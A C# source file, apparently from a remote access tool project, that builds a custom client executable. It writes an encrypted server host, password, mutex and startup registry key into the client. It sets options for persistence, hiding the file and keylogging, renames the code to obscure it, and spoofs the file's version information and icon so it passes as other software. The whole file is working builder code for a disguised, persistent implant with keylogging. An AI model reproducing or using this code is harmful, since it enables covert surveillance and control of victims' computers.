using System;
using System.IO;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Vestris.ResourceLib;
using xServer.Core.Cryptography;
using xServer.Core.Helper;

namespace xServer.Core.Build
{
    /// <summary>
    /// Provides methods used to create a custom client executable.
    /// </summary>
    public static class ClientBuilder
    {
        /// <summary>
        /// Builds a client executable. Assumes that the binaries for the client exist.
        /// </summary>
        /// <param name="output">The name of the final file.</param>
        /// <param name="tag">The tag to identify the client.</param>
        /// <param name="host">The raw host list.</param>
        /// <param name="password">The password that is used to connect to the website.</param>
        /// <param name="installsub">The sub-folder to install the client.</param>
        /// <param name="installname">Name of the installed executable.</param>
        /// <param name="mutex">The client's mutex</param>
        /// <param name="startupkey">The registry key to add for running on startup.</param>
        /// <param name="install">Decides whether to install the client on the machine.</param>
        /// <param name="startup">Determines whether to add the program to startup.</param>
        /// <param name="hidefile">Determines whether to hide the file.</param>
        /// <param name="keylogger">Determines if keylogging functionality should be activated.</param>
        /// <param name="reconnectdelay">The amount the client will wait until attempting to reconnect.</param>
        /// <param name="installpath">The installation path of the client.</param>
        /// <param name="iconpath">The path to the icon for the client.</param>
        /// <param name="asminfo">Information about the client executable's assembly information.</param>
        /// <param name="version">The version number of the client.</param>
        /// <exception cref="System.Exception">Thrown if the builder was unable to rename the client executable.</exception>
        /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
        /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
        public static void Build(string output, string tag, string host, string password, string installsub, string installname,
            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
            int reconnectdelay, int installpath, string iconpath, string[] asminfo, string version)
        {
            // PHASE 1 - Settings
            string encKey = FileHelper.GetRandomFilename(20);
            AssemblyDefinition asmDef;
            try
            {
                asmDef = AssemblyDefinition.ReadAssembly("client.bin");
            }
            catch (Exception ex)
            {
                throw new FileLoadException(ex.Message);
            }

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "xClient.Config.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //version
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(version, encKey);
                                            break;
                                        case 2: //ip/hostname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
                                            break;
                                        case 3: //password
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(password, encKey);
                                            break;
                                        case 4: //installsub
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installsub, encKey);
                                            break;
                                        case 5: //installname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installname, encKey);
                                            break;
                                        case 6: //mutex
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(mutex, encKey);
                                            break;
                                        case 7: //startupkey
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(startupkey, encKey);
                                            break;
                                        case 8: //encryption key
                                            methodDef.Body.Instructions[i].Operand = encKey;
                                            break;
                                        case 9: //tag
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(tag, encKey);
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(startup));
                                            break;
                                        case 3: //hidefile
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                            break;
                                        case 4: //Keylogger
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
                                {
                                    //reconnectdelay
                                    methodDef.Body.Instructions[i].Operand = reconnectdelay;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(installpath);
                                }
                            }
                        }
                    }
                }
            }

            // PHASE 2 - Renaming
            Renamer r = new Renamer(asmDef);

            if (!r.Perform())
                throw new Exception("renaming failed");

            // PHASE 3 - Saving
            r.AsmDef.Write(output);

            // PHASE 4 - Assembly Information changing
            if (asminfo != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(output);

                versionResource.FileVersion = asminfo[7];
                versionResource.ProductVersion = asminfo[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = asminfo[2];
                stringFileInfo["FileDescription"] = asminfo[1];
                stringFileInfo["ProductName"] = asminfo[0];
                stringFileInfo["LegalCopyright"] = asminfo[3];
                stringFileInfo["LegalTrademarks"] = asminfo[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = asminfo[5];
                stringFileInfo["OriginalFilename"] = asminfo[5];

                versionResource.SaveTo(output);
            }

            // PHASE 5 - Icon changing
            if (!string.IsNullOrEmpty(iconpath))
                IconInjector.InjectIcon(output, iconpath);
        }

        /// <summary>
        /// Obtains the OpCode that corresponds to the bool value provided.
        /// </summary>
        /// <param name="p">The value to convert to the OpCode</param>
        /// <returns>Returns the OpCode that represents the value provided.</returns>
        private static OpCode BoolOpcode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        /// <summary>
        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
        /// </summary>
        /// <param name="installpath">The integer value of the install path.</param>
        /// <returns>Returns the signed-byte value of the special folder.</returns>
        /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
        private static sbyte GetSpecialFolder(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFilesX86;
                case 3:
                    return (sbyte)Environment.SpecialFolder.SystemX86;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }
}